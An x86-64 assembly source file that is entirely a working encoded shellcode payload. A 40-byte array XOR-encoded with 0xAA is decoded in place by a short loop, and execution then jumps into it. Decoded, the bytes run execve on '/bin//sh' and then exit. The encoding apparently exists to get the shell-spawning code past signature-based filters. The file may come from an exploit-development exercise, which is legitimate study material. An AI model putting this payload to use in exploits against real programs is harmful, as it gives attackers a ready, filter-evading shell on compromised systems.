global _start
section .text

_start:
	xor rax,rax
	jmp restofCode

encodeStr: db 0xe2,0x9b,0x6a,0xfa,0xe2,0x11,0x85,0xc8,0xc3,0xc4,0x85,0x85,0xd9,0xc2,0xf9,0xe2,0x23,0x4d,0xfa,0xe2,0x23,0x48,0xfd,0xe2,0x23,0x4c,0x1a,0x91,0xa5,0xaf,0xe2,0x9b,0x6a,0xe2,0x23,0x6d,0x1a,0x96,0xa5,0xaf

restofCode:
	
	lea rdi,[rel encodeStr]
	xor rcx,rcx
	add cl,40
	jmp encode
encode:
	xor byte [rdi], 0xAA
	inc rdi
	loop encode
	
	jmp encodeStr
